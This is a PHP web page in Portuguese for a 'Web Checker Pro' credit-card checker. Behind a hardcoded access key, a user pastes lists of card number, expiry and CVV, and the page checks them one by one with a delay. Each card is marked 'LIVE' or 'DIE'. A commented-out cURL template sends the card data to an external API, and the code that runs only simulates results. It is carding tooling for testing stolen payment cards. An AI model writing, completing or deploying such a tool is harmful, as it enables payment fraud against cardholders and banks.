<?php
session_start();

// Chave de acesso única (12 caracteres: letras maiúsculas e números)
$chave_valida = "A4B9X2M7K1P8"; 
$erro = "";

// Processar Login por Chave
if (isset($_POST['f_login'])) {
    $chave_digitada = trim($_POST['chave'] ?? '');
    
    if ($chave_digitada === $chave_valida) {
        $_SESSION['logado'] = true;
        header("Location: index.php");
        exit;
    } else {
        $erro = "Chave de acesso inválida! Verifique os 12 caracteres.";
    }
}

// Processar Logout
if (isset($_GET['action']) && $_GET['action'] === 'logout') {
    session_destroy();
    header("Location: index.php");
    exit;
}

// Processar cada linha individualmente enviada pelo JavaScript
if (isset($_POST['ajax_linha'])) {
    if (!isset($_SESSION['logado'])) {
        echo "<span class='text-red-400 font-bold'>[ERRO DE SESSÃO] Faça login novamente.</span>";
        exit;
    }
    
    $linha = trim($_POST['ajax_linha']);
    if (empty($linha)) exit;

    $partes = explode('|', $linha);
    $numero = $partes[0] ?? '';
    $mes = $partes[1] ?? '';
    $ano = $partes[2] ?? '';
    $cvv = $partes[3] ?? '';

    // =========================================================================
    // COLOQUE SUA LÓGICA DE cURL REAL AQUI ABAIXO:
    // =========================================================================
    /*
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "SUA_API_EXTERNA_AQUI?numero=$numero&mes=$mes&ano=$ano&cvv=$cvv");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $resposta_api = curl_exec($ch);
    curl_close($ch);

    // EXEMPLO DE TRATAMENTO DA RESPOSTA DA API:
    // Suponha que sua API retorne uma string ou JSON contendo o código do erro ou sucesso.
    
    // Se a API retornar o código de erro 14 (Cartão Off / Inválido)
    if (strpos($resposta_api, '14') !== false) {
        echo "<span class='text-red-400 font-bold'>[DIE]</span> $linha <span class='text-red-300'>-> Erro 14: Cartão Off / Recusado</span>";
        exit;
    }
    
    // Se a API retornar sucesso com o código live 54 (Aprovado)
    if (strpos($resposta_api, '54') !== false || strpos($resposta_api, 'aprovado') !== false) {
        echo "<span class='text-emerald-400 font-bold'>[LIVE 54]</span> $linha <span class='text-emerald-300'>-> Aprovado com sucesso!</span>";
        exit;
    }
    
    // Caso venha outro tipo de resposta genérica da API
    echo "<span class='text-yellow-400 font-bold'>[RETORNO]</span> $linha -> $resposta_api";
    exit;
    */
    // =========================================================================

    // Simulação visual temporária (apague ou comente este bloco quando plugar sua API real)
    $codigos_simulados = [14, 54, 51, 00];
    $codigo_sorteado = $codigos_simulados[array_rand($codigos_simulados)];

    if ($codigo_sorteado == 14) {
        echo "<span class='text-red-400 font-bold'>[DIE]</span> $linha <span class='text-red-300'>-> Erro 14: Cartão off / Recusado</span>";
    } else {
        echo "<span class='text-emerald-400 font-bold'>[LIVE 54]</span> $linha <span class='text-emerald-300'>-> Aprovado com sucesso</span>";
    }
    
    exit;
}
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web Checker Pro - Detalhado</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-slate-900 text-slate-100 min-h-screen flex items-center justify-center p-4">

    <?php if (!isset($_SESSION['logado'])): ?>
        <!-- TELA DE LOGIN POR CHAVE DE 12 CARACTERES -->
        <div class="w-full max-w-md bg-slate-800 p-8 rounded-xl shadow-2xl border border-slate-700">
            <h1 class="text-2xl font-bold mb-2 text-center text-emerald-400">Acesso Restrito</h1>
            <p class="text-xs text-slate-400 text-center mb-6">Insira sua chave de acesso (12 caracteres)</p>
            
            <?php if (!empty($erro)): ?>
                <div class="bg-red-500/10 border border-red-500 text-red-400 p-3 rounded-lg mb-4 text-sm text-center">
                    <?php echo $erro; ?>
                </div>
            <?php endif; ?>

            <form method="POST">
                <input type="hidden" name="f_login" value="1">
                <div class="mb-6">
                    <label class="block text-sm font-medium mb-2 text-slate-300">Chave de Acesso:</label>
                    <input type="text" name="chave" required maxlength="12" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-3 text-sm focus:outline-none focus:border-emerald-500 text-slate-200 uppercase tracking-widest text-center font-mono" placeholder="A4B9X2M7K1P8">
                </div>
                <button type="submit" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-semibold py-3 rounded-lg transition duration-200 shadow-lg">
                    Entrar no Sistema
                </button>
            </form>
            <div class="mt-4 text-center text-xs text-slate-500">
                Chave padrão de teste: <b class="font-mono text-slate-400">A4B9X2M7K1P8</b>
            </div>
        </div>

    <?php else: ?>
        <!-- PAINEL PRINCIPAL -->
        <div class="w-full max-w-2xl bg-slate-800 p-6 rounded-xl shadow-2xl border border-slate-700">
            <div class="flex justify-between items-center mb-6 border-b border-slate-700 pb-4">
                <h1 class="text-xl font-bold text-emerald-400">Painel de Checagem em Tempo Real</h1>
                <a href="index.php?action=logout" class="bg-red-600/20 hover:bg-red-600/30 text-red-400 text-xs px-3 py-1.5 rounded-lg border border-red-500/30 transition">Sair</a>
            </div>
            
            <div class="mb-4">
                <label class="block text-sm font-medium mb-2 text-slate-300">Cole sua lista (NUMERO|MES|ANO|CVV):</label>
                <textarea id="lista" rows="5" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-3 text-sm focus:outline-none focus:border-emerald-500 text-slate-200 font-mono" placeholder="4066699932589171|04|2031|829"></textarea>
            </div>

            <div class="mb-4 flex items-center gap-4">
                <div class="w-1/2">
                    <label class="block text-sm font-medium mb-2 text-slate-300">Intervalo de Segurança:</label>
                    <select id="delay" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-2.5 text-sm text-slate-200 focus:outline-none">
                        <option value="1000">1 Segundo</option>
                        <option value="3000">3 Segundos</option>
                        <option value="5000" selected>5 Segundos (Recomendado)</option>
                        <option value="8000">8 Segundos</option>
                        <option value="10000">10 Segundos</option>
                    </select>
                </div>
                <div class="w-1/2 flex items-end">
                    <button onclick="iniciarChecagem()" id="btnChecar" class="w-full bg-emerald-600 hover:bg-emerald-500 text-white font-semibold py-3 rounded-lg transition duration-200 shadow-lg">
                        Iniciar Checagem
                    </button>
                </div>
            </div>

            <div class="mt-6">
                <div class="flex justify-between items-center mb-2">
                    <label class="block text-sm font-medium text-slate-300">Resultados Detalhados:</label>
                    <span id="contador" class="text-xs text-slate-400">Progresso: 0 / 0</span>
                </div>
                <div id="resultado" class="w-full h-52 bg-slate-900 border border-slate-700 rounded-lg p-3 text-xs font-mono overflow-y-auto text-slate-300 space-y-1">
                    Aguardando início...
                </div>
            </div>
        </div>

        <script>
            async function iniciarChecagem() {
                const texto = document.getElementById('lista').value.trim();
                const resDiv = document.getElementById('resultado');
                const btn = document.getElementById('btnChecar');
                const delayMs = parseInt(document.getElementById('delay').value);
                const contador = document.getElementById('contador');

                if (!texto) {
                    alert('Cole uma lista válida!');
                    return;
                }

                const linhas = texto.split('\n').map(l => l.trim()).filter(l => l !== '');
                if (linhas.length === 0) return;

                btn.disabled = true;
                btn.innerText = "Checando...";
                resDiv.innerHTML = "";
                
                for (let i = 0; i < linhas.length; i++) {
                    const linhaAtual = linhas[i];
                    contador.innerText = `Progresso: ${i + 1} / ${linhas.length}`;

                    try {
                        let response = await fetch('index.php', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                            body: 'ajax_linha=' + encodeURIComponent(linhaAtual)
                        });
                        let resultadoHtml = await response.text();
                        
                        resDiv.innerHTML += `<div>${resultadoHtml}</div>`;
                        resDiv.scrollTop = resDiv.scrollHeight;

                        if (resultadoHtml.includes('ERRO DE SESSÃO')) {
                            alert('Sua sessão expirou.');
                            window.location.reload();
                            break;
                        }

                    } catch (err) {
                        resDiv.innerHTML += `<div class='text-red-400'>[ERRO] Falha na requisição: ${linhaAtual}</div>`;
                    }

                    if (i < linhas.length - 1) {
                        await new Promise(resolve => setTimeout(resolve, delayMs));
                    }
                }

                btn.disabled = false;
                btn.innerText = "Iniciar Checagem";
            }
        </script>
    <?php endif; ?>
</body>
</html>
